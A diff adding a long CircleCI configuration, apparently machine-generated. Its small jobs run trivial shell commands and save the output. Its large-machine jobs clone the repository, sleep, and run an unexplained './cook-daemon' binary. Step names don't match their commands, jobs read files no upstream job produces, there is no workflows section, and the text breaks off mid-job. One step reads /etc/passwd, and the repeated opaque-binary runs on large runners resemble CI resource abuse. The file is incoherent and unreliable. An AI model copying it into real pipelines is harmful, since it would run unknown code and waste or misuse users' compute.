@@ -1,0 +1,1620 @@
+version: 2.1
+
+jobs:
+  j4-40:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: CORE737
+          command: |
+            mkdir -p /tmp/pst
+            set +o pipefail 2>/dev/null; seq 1 912197 > /tmp/pst/b4c19d18-c536; sha1sum /tmp/pst/b4c19d18-c536 > /dev/null; true
+            echo "crc=$(cksum /tmp/pst/b4c19d18-c536 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'b4c19d18-c536'
+  DEV_INIT_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  FLAG_CUR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: VerifyMaintenancePage3
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; ls -l /dev | grep "^c" | head -n 4; true ; } > /tmp/pst/api
+            echo "crc=$(cksum /tmp/pst/api | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'api'
+  UAT_VERIFY_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/api 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  hDCHiddenMidTime:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: package version tag unit 10
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f | awk -F'/' '{ print $NF }' | pr -4 -t -w 80; true ; } > /tmp/pst/lambdaomega
+            echo "crc=$(cksum /tmp/pst/lambdaomega | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'lambdaomega'
+  raj-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/57onenick3l 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  view_2015_02:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Swap Sidecar READY
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; for word in `seq 3`; do printf '%02d\n' ${word}; done; true ; } > /tmp/pst/iw2kgCeOZFqDHC35VWm
+            echo "crc=$(cksum /tmp/pst/iw2kgCeOZFqDHC35VWm | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'iw2kgCeOZFqDHC35VWm'
+  rust-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  table-2021-w04:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: warmup state paused
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; cat /etc/skel/.profile | tr -cs '[:alnum:]' '\n' | fmt -w 41 | tr -s ' '; true ; } > /tmp/pst/temp4f71b3
+            echo "crc=$(cksum /tmp/pst/temp4f71b3 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'temp4f71b3'
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/temp4f71b3 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  ITEM_202606:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Massage the leave requests
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 3 -group root -exec ls -ld {} + 2>/dev/null | sort | head -12; true ; } > /tmp/pst/102.0.124.134
+            echo "crc=$(cksum /tmp/pst/102.0.124.134 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '102.0.124.134'
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/13be3299-2503-8e64-8a51-5ccc209d89 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  SVGScene5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: team roster renewal FAIL
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; trim(){ echo "[$(date +%T)] $*"; }; trim 'done!'; true ; } > /tmp/pst/token_atoll
+            echo "crc=$(cksum /tmp/pst/token_atoll | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'token_atoll'
+  validate-staging-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  dbg_bin_inv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: span 123c
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; id=goose printenv id; true ; } > /tmp/pst/C
+            echo "crc=$(cksum /tmp/pst/C | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'C'
+  APP-965:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  releaseManifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Wrap The Pick List For Route 3
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; if [ ! -h /etc/os-release ]; then echo 'exists'; fi; true ; } > /tmp/pst/0f8cfb6a2
+            echo "crc=$(cksum /tmp/pst/0f8cfb6a2 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '0f8cfb6a2'
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/0f8cfb6a2 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  WK-NAME-SUB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Lockfile archival pass
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; for val in lena ann pete judy liam sam; do printf '%s\n' "$val"; done|wc -l; true ; } > /tmp/pst/stage2c4d643
+            echo "crc=$(cksum /tmp/pst/stage2c4d643 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'stage2c4d643'
+  VERIFY_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  namespaceStr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Sample gradient clipping
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; for path in ${HOME}/.bash*; do stat -c "%s %n" $path; done; true ; } > /tmp/pst/21.05.2023
+            echo "crc=$(cksum /tmp/pst/21.05.2023 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '21.05.2023'
+  europa-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  private_lower:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: TODO encryption later
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; date -d @988210751; true ; } > /tmp/pst/2988c8e9fa0310d1eed42bdec32f040502e
+            echo "crc=$(cksum /tmp/pst/2988c8e9fa0310d1eed42bdec32f040502e | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '2988c8e9fa0310d1eed42bdec32f040502e'
+  min-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  az-IE-x-glacier:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Check the cookie banner is disabled
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; n='pack bags' && printf '%s\n' "${n^^}"; true ; } > /tmp/pst/trace-fb6a8.log
+            echo "crc=$(cksum /tmp/pst/trace-fb6a8.log | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'trace-fb6a8.log'
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/57onenick3l 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  assert_segment_inner:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Fuel check
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; sha1sum "$HOME/.bashrc" >/tmp/otter20210223.chk && sha1sum -c /tmp/otter20210223.chk; true ; } > /tmp/pst/spark_fen_guest_atoll
+            echo "crc=$(cksum /tmp/pst/spark_fen_guest_atoll | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'spark_fen_guest_atoll'
+  PrepareProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/spark_fen_guest_atoll 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  colMocha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Act IX Hero Banner Fade
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; for n in `seq 4` ; do printf '%02d\n' "${n}"; done | nl; true ; } > /tmp/pst/y
+            echo "crc=$(cksum /tmp/pst/y | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'y'
+  API-570:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/57onenick3l 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  IN-ELEMENT-SW:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: mk9 pngs
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; tar czf /dev/shm/price.tar.gz -C /etc shells && tar --list --gzip --file=/dev/shm/price.tar.gz; true ; } > /tmp/pst/RPCPDF
+            echo "crc=$(cksum /tmp/pst/RPCPDF | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'RPCPDF'
+  py311-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  wrapperchannel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: No tunnel without approval
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; ls -sQ /var/spool | paste -sd ' '; true ; } > /tmp/pst/driver_3736
+            echo "crc=$(cksum /tmp/pst/driver_3736 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'driver_3736'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/driver_3736 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  ay51:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Haul the RAID array out of region b
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; tar cf "/tmp/lib-final.tar" -C /etc hosts && tar -rf "/tmp/lib-final.tar" -C /etc shells && tar -tf "/tmp/lib-final.tar"; true ; } > /tmp/pst/h4wk_w411e7_c3d4r
+            echo "crc=$(cksum /tmp/pst/h4wk_w411e7_c3d4r | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'h4wk_w411e7_c3d4r'
+  assemble-partial-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  i18n-ta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: We have to inspect the static routes
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; { echo 'hey you'; echo 'task 1 of 3'; }|sort; true ; } > /tmp/pst/57onenick3l
+            echo "crc=$(cksum /tmp/pst/57onenick3l | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '57onenick3l'
+  ivan-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/57onenick3l 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  hWndIteratorLegacyTensor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Part 17 archive the training records
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; ls /usr/share | tail -n 4 | fmt -w 48; true ; } > /tmp/pst/0r
+            echo "crc=$(cksum /tmp/pst/0r | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '0r'
+  feb12-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/0r 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  release-record:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Also translate the cookbook
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; (trap "echo cleaning up" EXIT; echo "what's next?"); true ; } > /tmp/pst/bUNDlezinCvECtOR
+            echo "crc=$(cksum /tmp/pst/bUNDlezinCvECtOR | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'bUNDlezinCvECtOR'
+  may25-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/57onenick3l 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  p_CART_ARG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Ship the calibration beads back to west
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; awk -F ":" '$3 > $4 { print $6 }' /etc/passwd | nl; true ; } > /tmp/pst/Tqna
+            echo "crc=$(cksum /tmp/pst/Tqna | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'Tqna'
+  papa-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/Tqna 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  initWithPixel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Ola takes generation
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; compgen -b|sort|uniq|wc -l; true ; } > /tmp/pst/snapshot-1865
+            echo "crc=$(cksum /tmp/pst/snapshot-1865 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'snapshot-1865'
+  validate-full-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/snapshot-1865 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  an1m4tez:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: The desk assignments are to be notified next
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; sort /etc/os-release | sed 's/=.*//' | tail -n 8; true ; } > /tmp/pst/20170928
+            echo "crc=$(cksum /tmp/pst/20170928 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '20170928'
+  v1-ga1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/57onenick3l 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
